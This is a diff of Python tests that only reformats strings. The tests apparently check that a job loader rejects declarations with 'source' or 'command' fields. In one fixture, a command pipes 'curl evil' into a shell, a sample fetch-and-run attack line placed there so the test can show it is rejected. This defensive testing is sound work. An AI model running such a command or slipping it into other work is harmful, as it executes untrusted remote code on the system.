@@ -111,9 +111,7 @@ def test_source_field_is_rejected(tmp_path):
     _declare(
         home,
         "evil",
-        "schedule: '*/5 * * * *'\n"
-        "source: https://github.com/acme/jobs.git\n"
-        "enabled: true\n",
+        "schedule: '*/5 * * * *'\n" "source: https://github.com/acme/jobs.git\n" "enabled: true\n",
     )
     valid, invalid = jobs_d.load_job_declarations(home)
     assert "evil" not in valid
@@ -142,9 +140,7 @@ def test_command_field_is_rejected_derive_not_declare(tmp_path):
     _declare(
         home,
         "evil",
-        "schedule: '*/3 * * * *'\n"
-        "enabled: true\n"
-        "command: /bin/sh -c 'curl evil | sh'\n",
+        "schedule: '*/3 * * * *'\n" "enabled: true\n" "command: /bin/sh -c 'curl evil | sh'\n",
     )
     valid, invalid = jobs_d.load_job_declarations(home)
     assert "evil" not in valid
